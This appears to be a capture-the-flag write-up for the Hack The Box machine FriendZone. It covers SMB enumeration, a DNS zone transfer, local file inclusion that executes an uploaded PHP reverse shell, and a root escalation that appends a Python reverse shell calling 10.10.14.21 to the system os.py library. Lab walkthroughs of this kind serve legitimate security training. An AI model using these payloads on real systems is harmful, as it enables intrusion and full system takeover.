## FriendZone

Difficulty: Easy

### User Flag

On nmap, we find a domain name called friendzone.red. Put this on /etc/hosts.

```
rustscan -a 10.10.10.123 --ulimit 5000 -- -A -sV -sC -oN nmap.txt -Pn
```

![nmap](https://github.com/b1d0ws/OSCP/assets/58514930/b85884f9-a01a-4841-9c73-85542e3f876e)

<br>

Enumerating SMB, we find credentials inside /General on creds.txt file.

```
smbmap -H 10.10.10.123

smbclient //10.10.10.123/general -U ""
```

![smbmap](https://github.com/b1d0ws/OSCP/assets/58514930/d8d8b00b-fa39-44f4-b861-9aeaaf618d40)

![credsTXT](https://github.com/b1d0ws/OSCP/assets/58514930/064ccdde-ca38-4653-b241-b8692c285b15)

<br>

We can enumerate subdomain with DNS Zone Transfer.

```
dig axfr @10.10.10.123 friendzone.red
```

![zoneTransfer](https://github.com/b1d0ws/OSCP/assets/58514930/17c8c03e-23d4-477c-9303-bd884dbe3eee)

<br>

We can use the found credentials on administrator1.friendzone.red.

![adminLogin](https://github.com/b1d0ws/OSCP/assets/58514930/1b9d8cc5-8a56-40d9-bb9b-678d65925d36)

![loginPHP](https://github.com/b1d0ws/OSCP/assets/58514930/16cdadc3-9353-4793-a253-b0648347b683)

<br>

On dashboard, we can use parameter pagename to perform LFI. First, upload a PHP Reverse Shell on Development SMB Folder and execute acessing it on /etc/development.  

We can guess that this is the directory since "File" directory is on /etc/files as smbmap brought to us.

```
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/php-reverse-shell
```

![friendzoneAdmin](https://github.com/b1d0ws/OSCP/assets/58514930/e57c6e79-e02c-45a0-95ca-76b0332c1882)

![testingParameters](https://github.com/b1d0ws/OSCP/assets/58514930/988512fd-bd43-4a41-8a26-fcb72da2f7ab)

![developmentReverse](https://github.com/b1d0ws/OSCP/assets/58514930/5eb61e67-5d35-44ba-b201-5a79185a6295)

![reverseShell](https://github.com/b1d0ws/OSCP/assets/58514930/7a7caddc-9a56-48ed-989b-9fe3a7b34ed3)

<br>

### Root Flag

#### Friend User

We can find friend's password inside /var/www/mysql_data.conf and login via SSH.

![friendCredentials](https://github.com/b1d0ws/OSCP/assets/58514930/48143dc4-e1b2-40ec-8c60-a8425550bb20)

#### Privilege Escalation

Using pspy, there is a cronjob running /opt/server_admin/reporter.py.

![pspy](https://github.com/b1d0ws/OSCP/assets/58514930/31653c10-c729-454c-891b-c633c2f7ed8d)

Looking at this file, "os" library is being used and we have permission to edit its file.  

Put a python reverse shell in the end of the file and get a root reverse shell.

```
nano /usr/lib/python2.7/os.py

import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.21",3333))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("bash")
```

![reporterPy](https://github.com/b1d0ws/OSCP/assets/58514930/1293daf7-3c03-4419-a813-687c2942e642)

![editingLibrary](https://github.com/b1d0ws/OSCP/assets/58514930/95e744dc-b490-4939-a4f2-4dee9cf43ba0)
